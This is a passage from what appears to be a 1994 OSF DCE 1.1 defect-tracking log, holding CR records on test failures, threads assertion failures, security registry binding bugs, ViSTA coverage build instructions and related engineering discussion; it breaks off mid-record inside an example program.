[4]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[4]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[4]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[4]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[4]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[4]Testcase [4]BODYstr_to_filter007v failed
[5]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[5]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[5]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[5]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[5]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[5]Testcase [5]BODYstr_to_filter007v failed
[6]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[6]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[6]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[6]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[6]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[6]Testcase [6]BODYstr_to_filter007v failed
[7]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[7]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[7]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[7]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[7]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[7]Testcase [7]BODYstr_to_filter007v failed
[8]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[8]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[8]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[8]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[8]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[8]Testcase [8]BODYstr_to_filter007v failed
[9]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[9]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[9]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[9]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[9]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[9]Testcase [9]BODYstr_to_filter007v failed
[10]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[10]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[10]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[10]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[10]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[10]Testcase [10]BODYstr_to_filter007v failed
[11]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[11]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[11]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[11]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[11]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[11]Testcase [11]BODYstr_to_filter007v failed
[12]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[12]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[12]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[12]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[12]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[12]Testcase [12]BODYstr_to_filter007v failed
[13]BODYstr_to_filter007v: 	(ERROR) expected and received OM_return_code from omX_string_to_object differ
[13]BODYstr_to_filter007v: 	omX_string_to_object expected OM_SUCCESS
[13]BODYstr_to_filter007v: 	omX_string_to_object returned OM_TEMPORARY_ERROR
[13]BODYstr_to_filter007v:  Func xt_run : Function call FAILED
[13]BODYstr_to_filter007v: STRING_TO_OBJECT returned ERROR

[13]Testcase [13]BODYstr_to_filter007v failed
[1]SHUTDOWNstr_to_filter007v(shutdown): SHUTDOWN returned OK

[1]Testcase SHUTDOWNstr_to_filter007v(shutdown) passed


If I run the test single - by hand - it works.

I switched on XDS_LOG=1 and deleted some lines in TET 
(which unset XDS_LOG if set - why, Leo ???) and did run TET again -
now all worked fine.

I checked xoms/xos.c : OM_TEMPORARY_ERROR is only returned if
xos__invoke_xoi_initialize fails.

Any idea, Naik or Chris? May be we need another mutex??

[07/19/94 public]
Now I could reproduce this problem with XDS_LOG=1 
on thread_af/T10str_to_rdn011i: here is log_xds<pid>:

[1] ==========================================================================
[1] Tue Jul 19 12:22:16          PROCESS-ID: 9686          USER-ID: root
[1] 
[1] --------------------------------------------------------------------------
[1] -> ds_initialize()
[1] 
[1]    NOTICE: default DSA name:   85.4.6^Cde^A85.4.10^Cdbp^A85.4.11^Cdap11^A85
.4.3^Cdsa^A85.4.3^Cdsa-m1
[1]    NOTICE: workspace 0 has been initialized
[1] 
[1] <- ds_initialize()
[1] 
[1] --------------------------------------------------------------------------
[1] -> ds_version()
[1] 
[1]    INPUT ARGUMENTS:
[1] 
[1] feature_list = {
[1]   { DS_BASIC_DIR_CONTENTS_PKG, OM_TRUE },
[1]   { DS_MHS_DIR_USER_PKG, OM_TRUE },
[1]   { DSX_GDS_PKG, OM_TRUE },
[1] }; /* feature_list */
[1] 
[1]    NOTICE: Basic Directory Contents Package activated
[1]    NOTICE: MHS Directory User Package activated
[1]    NOTICE: Global Directory Service Package activated
[1]    NOTICE: default-session is a DSX_C_GDS_SESSION object
[1]    NOTICE: default-context is a DSX_C_GDS_CONTEXT object
[1] 
[1] <- ds_version()
[1] 
[1] --------------------------------------------------------------------------
[1] -> ds_initialize()
[1] 
[1]    NOTICE: default DSA name:   85.4.6^Cde^A85.4.10^Cdbp^A85.4.11^Cdap11^A85
.4.3^Cdsa^A85.4.3^Cdsa-m1
[1]    NOTICE: workspace 1 has been initialized
[1] 
[1] <- ds_initialize()
[1] 
[1] --------------------------------------------------------------------------
[1] -> ds_version()
[1] 
[1]    INPUT ARGUMENTS:
[1] 
[1] feature_list = {
[1]   { DSX_GDS_PKG, OM_TRUE },
[1]   { DS_BASIC_DIR_CONTENTS_PKG, OM_TRUE },
[1] }; /* feature_list */
[1] 
[1]    NOTICE: Global Directory Service Package activated
[1]    NOTICE: default-session is a DSX_C_GDS_SESSION object
[1]    NOTICE: default-context is a DSX_C_GDS_CONTEXT object
[1]    NOTICE: Basic Directory Contents Package activated
[1] 
[1] <- ds_version()
[1] 
[4]    ERROR: Invalid XOM object info schema File </opt/dcelocal/var/adm/direct
ory/gds/adm/xoischema> - Error <-24>  Line No.<185>
[1] --------------------------------------------------------------------------
[1] -> ds_shutdown()
[1] 
[1]    NOTICE: workspace 1 has been shutdown
[1] 
[1] <- ds_shutdown()
[1] 

It doesn't happen always - sometimes all testcases do run, sometimes
T10str_to_rdn011i is failing, sometimes another one is dumping core, ...

[8/24/94 public]
Didn't see this when running FVT against BL16.  I'll try running this
repetitively overnight.

[8/25/94 public]
Haven't been able to reproduce this.

[9/1/94 public]
Closing this because I haven't seen it.  Will reopen if it turns up during
later testing.

[10/12/94 public]
Reopened. See 12581. Same behaviour.
We tested this some months ago. Sometimes just the testcase was failong -
sometimes it dumped core with exactly the stack shown in 12581.
We have no idea what the problem really is. All we know is that
sometimes the sscanf fails when the xoi_schema file is read.

[10/12/94 public]
Dropping this to C1 for the following reasons:  even though it results in a
core dump, which is usually an A, this seems to happen so rarely that an
acceptable workaround really is 'run the test again.'  Also, this isn't a 0
because it isn't the highest priority defect to work on right now.



CR Number                     : 11300
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : problem of quoted name with back slash at the end
Reported Date                 : 7/14/94
Found in Baseline             : 1.1
Found Date                    : 7/14/94
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/14/94 public]

The document says that if the back slash is at the end, it will mean a
continuation, and you will get prompt for more input.

I am running B11 1.1's cdscp, after typing "\" folowed by <CR>, I never
got the prompt for anything. Looks like cdscp hanged.

With 1.0.3, it works fine. But if I quote the name with " (to include
spaces in name, for example), it gives error:

cdscp> create obj /.:/"a b c\
syntax error
create obj /.:/"a b c\
           ^

[7/14/94 public]
I down graded this.  No old control program bug should be either an 
A or B, the work around is used dcecp (only a very few exceptions to 
this when dcecp doesn't implement the functionality).  Since this is
not a common problem it is not a major problem, hence a D and not a C.

Old control program bugs particularly cdscp just aren't going to be fixed 
for 1.1.  Priority 4.



CR Number                     : 11252
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 10300
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : libdce libraries
Short Description             : need a option to build either the libraries going into libdce or not
Reported Date                 : 7/11/94
Found in Baseline             : 1.1
Found Date                    : 7/11/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/11/94 public]

The libraries going into libdce do not necessarily have to be built.
Until now some Makefiles (i.e. gds/ASN1/Makefile) use for that

.if ${USE_SHARED_LIBRARIES} == 0
  LIBRARIES     = libasn1.a
  EXPLIB_TARGETS        = ${LIBRARIES:S/^/export_/g}
  libasn1.a_EXPDIR  = /usr/lib/
.endif

Some other (most of the other gds libraries - libdua, libd27, ...)
do just build the library - see OT 10300.

I think USE_SHARED_LIBRARIES is a bad option - it is used for 
other things already.

There should be another option to have the possibility to switch
on and off the build of the libraries which o-files go into
libdce.

[ sally 7/14/94 public ]
assigned this to sally



CR Number                     : 11208
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : ASN1
Short Description             : asn1.h should be more portable
Reported Date                 : 7/8/94
Found in Baseline             : 1.1
Found Date                    : 7/8/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/8/94 public]
In particular, a lot of lines are spent setting WORD and REALWORD for each
platform.  WORD is the number of bytes per word, REALWORD appears to be the
byte size.  This extended nested-if could be condensed such that WORD could
be calculated using WORD_BIT which is provided in limits.h.  I suppose we
could assume that bytes are always octets and let those few remaining
platforms that have different bytes sizes handle the calculations as a
special case.

[10/17/94 public]
Deferred for 1.2.



CR Number                     : 11172
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : 
Short Description             : assertion failure:  cma__queue_empty: Q corruption
Reported Date                 : 7/5/94
Found in Baseline             : 1.1
Found Date                    : 7/5/94
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/5/94 public]

Running DCE 1.1 available 6/28, including the 1.0.3a DFS that
it contains, the bosserver's log contained the following:

%Internal DCE Threads problem (version CMA BL10+), terminating execution.
% Reason: assertion failure:  cma__queue_empty: Q corruption
	at line 428 in /project/dce/build/dce1.1-snap/src/threads/cma_timer.c
% See 'cma_dump.log' for state information.
	**** Assertion failure. cma__queue_empty: Q corruption
     at line 428 in /project/dce/build/dce1.1-snap/src/threads/cma_timer.c
%Internal DCE Threads problem (version CMA BL10+), terminating execution.
% Reason: assertion failure:  cma__Queue_next: Q corruption
     at line 1743 in /project/dce/build/dce1.1-snap/src/threads/cma_debugger.c
% See 'cma_dump.log' for state information.
%Internal DCE Threads problem (version CMA BL10+), terminating execution.
% Reason: assertion failure:  cma__Queue_next: Q corruption
     at line 1743 in /project/dce/build/dce1.1-snap/src/threads/cma_debugger.c
% See 'cma_dump.log' for state information.
%Internal DCE Threads problem (version CMA BL10+), terminating execution.
% Reason: assertion failure:  cma__Queue_next: Q corruption
     at line 1743 in /project/dce/build/dce1.1-snap/src/threads/cma_debugger.c
% See 'cma_dump.log' for state information.
%Internal DCE Threads problem (version CMA BL10+), terminating execution.
% Reason: assertion failure:  cma__Queue_next: Q corruption
     at line 1743 in /project/dce/build/dce1.1-snap/src/threads/cma_debugger.c
% See 'cma_dump.log' for state information.
%Internal DCE Threads problem (version CMA BL10+), terminating execution.
     % Reason: assertion failure:  cma__Queue_next: Q corruption

Unfortunately the cma_dump.log referred to is empty. No tests were running
at the time.



CR Number                     : 11164
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : site name not evaluated properly 
when performing site_bind_{query,update}
Reported Date                 : 7/1/94
Found in Baseline             : 1.1
Found Date                    : 7/1/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/1/94 public]

When performing a sec_rgy_site_bind_update or query the site name 
is not evaluated correctly in two specific situations. 

If the site name starts with /.:/subsys/dce/sec the bind will 
fail unless of course the site name is /.:/subsys/dce/sec/master. 

If the site name starts with /.:/hosts the bind will fail. 

The error that is displayed is: 

Error: Registry server unavailable

Other compound names work correctly. For instance /.:/foo/bar will 
correctly bind the appropriate server for query or update.


[31-Aug-94 public]
priority lowered to indicate that this will not be fixed in the 1.1 mainline



CR Number                     : 11163
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : 
Short Description             : Add Vista/Veritas Capabilities
Reported Date                 : 7/1/94
Found in Baseline             : 1.1
Found Date                    : 7/1/94
Severity                      : E
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : lbe/mk/osf.std.mk, lbe/mk/osf.prog.mk, lbe/mk/osf.dce.passes.mk, lbe/mk/osf.obj.mk, Makeconf, threads/Makefile
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/1/94 public]

The Vista/Veritas functionality needs to be added to the 
common makefiles.

[7/22/94 ]

I have sent a request to the DRB to submit the code changes for Veritas
Vista support in DCE.

Here are instructions on how to build DCE with VISTA.

		BUILDING DCE WITH VISTA

Thanks to help from Andy Mckeen, Ed Frankenberry, Martha Lynch and Kevin
Sullivan, we've managed to build and test a few components (threads, time,
rgy_edit, dcecp, dced) with VISTA for DCE 1.1 on the at486 platform.
We did not have the time or space to test every component, although we 
did do complete builds of source and test on all three platforms with
the vista code in the common Makefiles but with VISTA undefined.

We don't have licenses for the VISTA "covcc" binaries and libraries for the
HPUX and RIOS platforms (site licenses are $1500 per platform), but HP and
IBM do, so we can depend on their building DCE 1.1 with VISTA on these
respective platforms.  OR we can use the statistics that we get from running
VISTA on the 486, since the results shouldn't differ that much between
platforms (just a guess).

1) Mount the VISTA binaries and libraries via "osfmount" (mounts it on
   "/usr/vista" from "pomerol.osf.org"):

        osfmount vista

2) Then you *must* define the following VISTA environmental variables:

        setenv VISTA 1
        setenv VLM_HOST pomerol
        setenv VISTAHOME /usr/vista
        set path = ( /usr/vista/bin $path )
        setenv VISTA_ARGS "-o cov3.o"
        setenv HIT_FILE <filename of your hit file including its full path>
   
   "cov3.o" is not required since by default Vista will link in the cov.o
   coverage monitor.  The cov3.o adds the  capability to monitor programs 
   that use fork/exec.

   Building VISTA involves using the VISTA tool "covcc" which is a preproces-
   sor to the C compiler that instruments the object files for dynamic metrics
   and produces ".M" map files for static metrics.

   On the "covcc" command line all arguments from "covc"" to "--" belong to
   "covcc", while arguments after "--" are handed to "cc", "ld" or "ar" which
   are the usual C compiler utilities.

3) Build and install VISTA in DCE.

   You can either:

        - build only the static metrics.  ODE will do no compiling but will
          produce a ".M" VISTA map file containing static metrics for each
          ".o" that would otherwise be generated.  For example, in the
          threads component:

                mkdir -p src/time
                cd src/time
                build statmet_all
                su
                build install_all

        - build both dynamic and static metrics: this is the default.  ODE
          will compile and produce both ".o" and ".M" files.  The object files
          will be instrumented with VISTA, having VISTA code for every routine
          entry and exit and branch entry.  For example, in threads:

                mkdir -p src/time
                cd src/time
                build build_all
                su
                build install_all

   You can build VISTA for all of DCE, but please note that:

        - it greatly slows the DCE build since dynamic metrics inserts
          VISTA code into every routine entry and exit point and every code
          branch point in every object file, and static metrics produces
          a map file for every DCE object file.
        - you will need more, maybe much more, space for the DCE outputs
          because:
                - each .o file will be larger,
                - each .o files will now have a corresponding .M map file,
                - thus the resulting binaries and libraries will be larger.

   More likely you will build VISTA in a single DCE component at a time as
   you need to measure the component's performance.

   Lots of warning messages may display for some components or subcomponents.

4.) If you want to see the hits information. When you excecute the program
    that has been built with Vista it will put all that data in a
    hits file - defaulting to the location you excecute the command from or
    overiding that with the value of HIT_FILE>

5.) If you need further information please see Martha Lynch.  She has more
   detailed instructions on how to use Vista.

[07/26/94 public]
Changed setenv VISTA -> setenv VISTA 1

[07/26/94 public]
changed HIT_FILE definition, changed open status to fix.

[08/10/94 public]
Attempt to build statmet_all target (static metrics) per
rrizzo's instructions above fails:

(NB: Andy McKeen saw this same failure while helping me rule
out "management error.")

pedro 68 % build statmet_all
relative path: ./time
cd ../../obj/at386/time
[ /time/common ]
makepath common/. && cd common &&  exec make MAKEFILE_PASS=BASIC  _SUBMAKE_=_IS_SUBMAKE_   statmet_all
covcc   -thm    -z /project/dce/build/dce1.1/tools/at386/macho/gcc  -- -B/project/dce/build/dce1.1/too/at386/macho/  -I. -I/u1/pshaw/sandboxes/dce11/src/time/common -I/project/dce/build/dce1.1/src/time/coon  -I. -I/u1/pshaw/sandboxes/dce11/src/time/common -I/project/dce/build/dce1.1/src/time/common -IPOSI-I/u1/pshaw/sandboxes/dce11/src/time/common/POSIX -I/project/dce/build/dce1.1/src/time/common/POSIX -I1/pshaw/sandboxes/dce11/export/at386/usr/include -I/project/dce/build/dce1.1/export/at386/usr/include /project/dce/build/dce1.1/src/time/common/time_support.c
In file included from /project/dce/build/dce1.1/src/time/common/time_support.c:74:
/project/dce/build/dce1.1/src/time/common/POSIX/dts.h:54: dcedtssvc.h: No such file or directory
covcpp: cpp failed:  /project/dce/build/dce1.1/tools/at386/macho/gcc -E -C -D__COVCC__ -B/project/dce/ild/dce1.1/tools/at386/macho/ -I. -I/u1/pshaw/sandboxes/dce11/src/time/common -I/project/dce/build/dce1/src/time/common -I. -I/u1/pshaw/sandboxes/dce11/src/time/common -I/project/dce/build/dce1.1/src/timeommon -IPOSIX -I/u1/pshaw/sandboxes/dce11/src/time/common/POSIX -I/project/dce/build/dce1.1/src/time/cmon/POSIX -I/u1/pshaw/sandboxes/dce11/export/at386/usr/include -I/project/dce/build/dce1.1/export/at38usr/include /project/dce/build/dce1.1/src/time/common/time_support.c
covcc: failed to cpp preprocess
*** Error code 1
`statmet_all' not remade because of errors.
*** Error code 1
`statmet_all' not remade because of errors.

[kevins 8/11/94 public] 

For some reason your build is not doing the AUTOGEN pass. I checked out 
the process for building with default Vista (static and dynamic metrics) 
in clean sandbox and it worked fine. The problem seems to be only with the 
static metric generation. 

The statmet_all process needs to be updated to run AUTOGEN and 
export_all_EXPINC before running the covcc. 

starting

[annie 9/6/94 public] 
update instructions for building components

[annie 9/6/94 public] 
If you ever get the error message as followed during the build:

VERITAS ViSTA License Authorization Failure.

It means that our license has VERITAS VISTA license has expired.

[annie 9/6/94 public] 
Because DCE has a lot of components and you can potentially run out of 
diskspace trying to build with VISTA turned on, the suggestion is break
up the DCE components, and build from there.  

    1) osfmount vista

    2) in your dce sandbox, specify the workon command 

    3) in a ksh shell, 

        export VISTA=1 
        export VLM_HOST=pomerol
        export VISTAHOME=/usr/vista
        export PATH=/usr/vista/bin:$PATH
        export VISTA_ARGS="-o cov3.o"
        export HIT_FILEi=<filename of your hit file including its full path>

    4) - build both dynamic and static metrics: this is the default.
      
       example:
           cd src/time
           build build_all
           su root
           build install_all
      
       The DCE components may be broken down as followed:
           src/time            src/admin/tcl_dce     src/config          
           src/directory/xoms  src/test              src/tools

       The following DCE components still have problems and I am
       looking into this.  The problems are unrelated to veritas.
       It is just that the component Makefile was not robust enough
       for a component build.
           src/admin/dcecp     src/admin/dced        src/dce
           src/directory/cds   src/directory/gds     src/directory/xds   
           src/file            src/libdce            src/libdcedfs
           src/noship          src/nosupport         src/rpc          
           src/security

           src/threads src/time src/tools 
  
       NOTE: you could potentially get a bunch of warnings messages 
       during the build.  However, you SHOULD NOT encounter any errors.

    5) - build only the static metrics.  
       cd src/time
       build statmet_all 
       su root
       build install_all

[annie 9/6/94 public] 
I did not have a chance to finish this.  Given the time frame we have,
we will have to defer this.  I was trying to figure out how one can 
build with veritas component-wise.  Oh well.  Defer to DCE1.2

thanks
annie

[psn 2/6/94 public] 
Changed it enhancement as was confirmed by Mark. Not everybody is using
Vista. Also Veritas has sold it off already and I don't think the
knowledge of such third party tool into DCE makefiles would do any
great help.



CR Number                     : 11100
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : acl
Short Description             : sec_acl_test_access on -ic
Reported Date                 : 6/27/94
Found in Baseline             : 1.1b10
Found Date                    : 6/27/94
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/27/94 public]
Ok, pie in the sky enhancement not for 1.1.  

I would like to be able to test access on an initial container ACL.
Here's a case for why: In writing the subtree commands for CDS if you
want to check if you can create a subtree underneath an existing object,
you need to check two things.  First can you create objects in the
directory ( ir on dir and w on the clearinghouse).  Second, if you are
creating grandchildren, you need to make sure that you can create
objects in the newly created child directories.  What are the ACL's on
a child directory?  Well since it will be created beneath the parent,
it will be the initial container ACL of the parent.  To check if you
have permissions to do this, you need to see if you have ir on the
parent's initial container ACL.  Having an API to do this would be much
easier (and certainly more correct) than getting the ACL and doing the
access check yourself.

There should be a new fucntion added to the ACL interface just like
sec_acl_test_access() that has a sec_acl_type_t parameter as most of the
other ACL routines do.

[8/1/94 public]
I'll accept a lower priority but it's still a severity B since there is no
work-around.  This is not a cosmetic enhancement request.



CR Number                     : 11073
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : registry
Short Description             : sec_rgy_site_bind_update() returns "Registry server unavailable" for unavailable slave replica passed in.
Reported Date                 : 6/24/94
Found in Baseline             : 1.1b10
Found Date                    : 6/24/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/24/94 public]

I have a 3-machine cell configuration with one slave replica.

I invoke sec_rgy_site_bind_update() with the slave replica name,
like /.../dcecp_cell.osf.org/subsys/dce/sec/ice and it would bind to
the update site in that cell.  Great, this is what is expected.

Now, say I kill the slave security server. I used to invoke
sec_rgy_site_bind_update() with the same slave replica name and 
it would function as above. 

However, now I get the error "Registry server unavailable". It seems
that sec_rgy_site_bind_update() is now less forgiving than 2 months
ago.

Although not documented anywhere, we were be able
to pass in an invalid replica name or one that was "unavailable"
 and we were be able to bind to the master registry server in that cell.

Whatever is decided here, it must be documented in the man pages about
how forgiving this security API really is.


[31-Aug-94 public]
priority lowered to indicate that this will not be fixed in the 1.1 mainline



CR Number                     : 11067
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : cds
Subcomponent Name             : server
Short Description             : cdsd spins when secd server crashes
Reported Date                 : 6/24/94
Found in Baseline             : 1.1
Found Date                    : 6/24/94
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/24/94 public]

Using 1.1 basline 10 (BETA) in a split server cell (secd on RIOS soldier,
cdsd on HP west), dfs tests glue and lock cause soldier to crash within
2 hours - at which point cdsd begins spinning.

Here's the output from top, 13 hours after soldier crashed:

TTY   PID USERNAME  PRI   NI  SIZE  RES  STATE   TIME   %WCPU  %CPU  COMMAND
?     5462 root    241   20  6616K 1988K  wait  242:26  99.52  99.35 cdsd

I've reproduced this twice - before the 2nd time, I set up serviceability
so the log:
 
	west:/u0/cds_svc.3.10000

may hold some clues ...

I've given this a high severity (A) and priority (1) because, even after
I restart secd, cdsd does not recover - I will lower the severity/priority
if people feel that it is acceptable that cdsd has to be shutdown and
restarted if secd bounces.

[8/24/94 public]
If we get through the all of the P1s we may visit this but this bug
refers to a condition that happens only when secd has died. It does
not take precedence over other the remaining P1s.

[9/19/94 public]
Finally, I can agree with the priority on this one ... at least, in
this weekend's case. The secd for the cell went down at:

root@cobbler> ls -l /opt/dcelocal/var/security/core
-rw-rw-rw-   1 root     bin      5189323 Sep 17 00:16 /opt/dcelocal/var/security/core

The cell was configured at:

root@cobbler> ls -l /opt/dcelocal/dce_cf.db
-rw-r--r--   1 root     bin           60 Sep 16 18:21 /opt/dcelocal/dce_cf.db

at:
Mon Sep 19 10:53:33 EDT 1994
ps -ef|grep cdsd
    root  2615     1  0  Sep 16  ?       198:17 cdsd -a

Restarting secd (with -debug at least) allowed unauthenticated 
cdscp show dir to succeed. (dce_login hangs so couldn't try auth'd)



CR Number                     : 11047
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : gdsdirinfo
Short Description             : alarming message from gdsdirinfo
Reported Date                 : 6/22/94
Found in Baseline             : 1.1
Found Date                    : 6/22/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/22/94 public]
If you invoke gdsdirinfo and GDS is not running, you get the following
message:

  root@gemini gds/ts$ gdsdirinfo 
  A shmget system call has failed (key = 1141200052, access mode = 666,
errno = 2). 

Which is rather alarming.  Formerly, gdsdirinfo would simply exit quietly
if GDS was not running.

This occurs on HP and 486.

[06/23/94 public]
This is OK. If exception logging is switched off exception logging
is put to stderr (see gds/util/d27svc.c: function d27_001_svc_init, line 161).
(d27_001_svc_init is called by gdsdirinfo: gds/ipc/d23dirinfo.c, line 129.)

You can avoid to get these messages by setting 
SVC_FATAL=FILE:/dev/null.

"errno = 2" means: all is OK. If you get other errno:
Something is wrong, and probably you can't activate.
I.e. "errno = 22" normally means that some gds processes are still running
(esp. attached to IPC). The right action is :

ps -ef|grep gds
kill -9 ...
gdssysadm -fA

[6/23/94 public]
So how is it that a message which means everything is okay is logged as a
fatal SVC message?

[07/07/94 public]
gdsdirinfo calls a ipc function (let's say d23_xxx) which is used 
not only by gdsdirinfo. d23_xxx calls shmget; if this fails
an exception is traced. This happens in d23_xxx - of course
independent on who called this function.

The "alarming message" is documented in the man page
for "gdsdirinfo". So I think this defect should be cancelled.

[7/7/94 public]
Yes, it is documented.  That's why it's an E3.  It is still, in my opinion,
a defect.



CR Number                     : 11042
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : thr
Subcomponent Name             : cma_close
Short Description             : cma_close doesn't work correctly on HP
Reported Date                 : 6/22/94
Found in Baseline             : 1.1b10
Found Date                    : 6/22/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/22/94 public]

A process started by execv gets all open file descriptors from it's
parent. To close them our gdsdsa calls a function
"close_unused_files"  to avoid the inheritance from the calling program.
But cma_close doesn't close these files - we think because there
haven't been opened by cma_open.

Here is an example program which illustrates the behaviour:

-------

/* This program shows a bug in threads. The behaviour is different    */
/* in a threaded and a non threaded environment.                      */
/* Let "x" be any existing system file.                               */

/* If compiled and linked in a sandbox on HP800, NONTHREAD being not  */
/* set, the function close_files never closes any files physically.   */
/* After every "execv" the filedescriptor for "x" is incremented      */
/* therefore, after 60 execv the process specific limit of open files */
/* is exceeded.                                                       */

/* If compiled and linked on HP800 by a call                          */
